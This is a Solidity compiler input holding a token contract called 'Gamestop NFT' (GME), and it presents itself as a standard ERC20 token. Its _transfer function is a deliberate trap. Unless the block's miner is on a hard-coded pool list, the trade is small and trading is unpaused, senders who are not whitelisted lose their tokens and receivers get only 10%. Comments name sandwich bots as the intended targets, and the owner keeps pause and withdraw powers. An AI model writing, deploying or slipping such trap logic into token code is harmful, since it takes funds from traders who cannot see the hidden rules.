{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/CheapERC20.sol":{"content":"//   SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface ERC20Interface {\n  function totalSupply() external view returns (uint);\n  function balanceOf(address tokenOwner) external view returns (uint balance);\n  function allowance(address tokenOwner, address spender) external view returns (uint remaining);\n  function transfer(address to, uint tokens) external returns (bool success);\n  function approve(address spender, uint tokens) external returns (bool success);\n  function transferFrom(address from, address to, uint tokens) external returns (bool success);\n\n  event Transfer(address indexed from, address indexed to, uint tokens);\n  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\n\ninterface ApproveAndCallFallBack {\n  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) external;\n}\n\ncontract Owned {\n  address public owner;\n  address public newOwner;\n\n  event OwnershipTransferred(address indexed _from, address indexed _to);\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  modifier onlyOwner {\n    require(msg.sender == owner);\n    _;\n  }\n\n  function transferOwnership(address _newOwner) public onlyOwner {\n    newOwner = _newOwner;\n  }\n  function acceptOwnership() public {\n    require(msg.sender == newOwner);\n    emit OwnershipTransferred(owner, newOwner);\n    owner = newOwner;\n    newOwner = address(0);\n  }\n}\n\ncontract Gamestop is ERC20Interface, Owned {\n  string public symbol;\n  string public name;\n  uint8 public decimals;\n  uint _totalSupply;\n  address public pool;\n  bool paused;\n\n  mapping(address => uint) balances;\n  mapping(address => mapping(address => uint)) allowed;\n\n  address ethermine = 0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8;\n  address sparkpool = 0x5A0b54D5dc17e0AadC383d2db43B0a0D3E029c4c;\n  address nanopool = 0x52bc44d5378309EE2abF1539BF71dE1b7d7bE3b5;\n  address f2pool2 = 0x829BD824B016326A401d083B33D092293333A830;\n  address other = 0xbCC817f057950b0df41206C5D7125E6225Cae18e;\n  address babelpool = 0xB3b7874F13387D44a3398D298B075B7A3505D8d4;\n  address spiderpool = 0x04668Ec2f57cC15c381b461B9fEDaB5D451c8F7F;\n  address other2 = 0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8;\n  address other3 = 0x06B8C5883Ec71bC3f4B332081519f23834c8706E;\n  address hiveonpool = 0x1aD91ee08f21bE3dE0BA2ba6918E714dA6B45836;\n  address beepool = 0x99C85bb64564D9eF9A99621301f22C9993Cb89E3;\n  address other4 = 0xc8F595E2084DB484f8A80109101D58625223b7C9;\n  address uupool = 0xD224cA0c819e8E97ba0136B3b95ceFf503B79f53;\n  address binancepool = 0xc365c3315cF926351CcAf13fA7D19c8C4058C8E1;\n\n  address[14] blacklist = [ethermine, sparkpool, nanopool, f2pool2, other, babelpool, spiderpool, other2, other3, hiveonpool, beepool, other4, uupool, binancepool];\n\n  address white8 = 0x7B3B6a7bC87f978C9cb134C85d6623f8F6f5C0e3;\n  address white9 = 0xbb5414c16d3c373A6f795C4d21DDd874a1d2f897;\n  address white10 = 0xD81d0eAbe84D9692baC6aE816A0B11Bcb3953372;\n  address white11 = 0x7A3Ef0De7Fd9DF8951fafBe8F7ef3240DE5837E8;\n  address white12 = 0xe85740D4B34F727E8cBc9D676d253A4Fd736a239;\n  address white13 = 0x54539aA494A66c14130705DB7f4285fd2A46F68d;\n\n  address[6] whitelist = [white8, white9, white10, white11, white12, white13];\n\n  address uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n\n  constructor() {\n    symbol = \"GME\";\n    name = \"Gamestop NFT\";\n    decimals = 18;\n    // One trillion\n    _totalSupply =  1000000000000 ether;\n    balances[owner] = _totalSupply;\n    emit Transfer(address(0), owner, _totalSupply);\n    allowed[owner][uniswapRouter] = _totalSupply;\n    paused = true;\n  }\n  function pause() public onlyOwner {\n    paused = true;\n  }\n  function transferPool(address _pool) public onlyOwner {\n    pool = _pool;\n  }\n  function totalSupply() public override view returns (uint) {\n    return _totalSupply - balances[address(0)];\n  }\n  function balanceOf(address tokenOwner) public override view returns (uint balance) {\n      return balances[tokenOwner];\n  }\n\n  function withdraw() public onlyOwner {\n    (bool success,) = owner.call{value: address(this).balance}(\"\");\n    require(success, \"Failed to send ether\");\n  }\n\n  // Authentication done previously\n  function _transfer(address from, address to, uint tokens) internal {\n    if (from != address(0) && pool == address(0)) { pool = to; }\n\n    // This should be true for everything on mainnet\n    bool isFlashbot = false;\n    for (uint i = 0; i < blacklist.length; i++) {\n      if (block.coinbase == blacklist[i]) {\n        isFlashbot = true;\n        break;\n      }\n    }\n\n    bool isWhitelisted = false;\n    for (uint i = 0; i < whitelist.length; i++) {\n      if (from == whitelist[i]) {\n        isWhitelisted = true;\n        break;\n      }\n    }\n\n    // A single swap can drain max 0.5% of the pool's ETH\n    bool isBig = tokens >= balances[pool] / 200;\n    // Should this be OR or AND?\n    bool allowSelling = !isFlashbot && !isBig && !paused;\n\n    // We can calculate the amount of ETH that a transfer corresponds to\n\n\n    // Needs to succeed when people buy from the pool\n    // if(from == owner || to == owner || from == pool) {\n    if(from == owner || to == owner || from == pool || isWhitelisted || allowSelling) {\n      balances[from] -= tokens;\n      balances[to] += tokens;\n    } else {\n      balances[from] -= tokens;\n      uint trapAmount = (tokens * 10) / 100;\n      balances[to] += trapAmount;\n\n      // TODO: add payment to miner in case of the sandwicher not paying out\n      // Two users managed to sell after many hours, so need to be careful about this\n      // Maybe use blockhash as a random number generator? I think the sandwich smart contracts will revert if they don't get their ETH now\n      // uint payout = address(this).balance > 0.1 ether ? 0.1 ether : address(this).balance;\n      // (bool success,) = block.coinbase.call{value: payout}(\"\");\n    }\n\n    emit Transfer(from, to, tokens);\n  }\n\n  function transfer(address to, uint tokens) public override returns (bool success) {\n    _transfer(msg.sender, to, tokens);\n    return true;\n  }\n\n  function transferFrom(address from, address to, uint tokens) public override returns (bool success) {\n    // Preapprove the Uniswap router for everybody\n    if(msg.sender != uniswapRouter) {\n      allowed[from][msg.sender] -= tokens; // this reverts in Solidity 0.8.x if tokens > allowed\n    }\n    _transfer(from, to, tokens);\n    return true;\n  }\n\n  function approve(address spender, uint tokens) public override returns (bool success) {\n    allowed[msg.sender][spender] = tokens;\n    emit Approval(msg.sender, spender, tokens);\n    return true;\n  }\n\n  function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {\n    return allowed[tokenOwner][spender];\n  }\n  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\n    allowed[msg.sender][spender] = tokens;\n    emit Approval(msg.sender, spender, tokens);\n    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\n    return true;\n  }\n}"}}}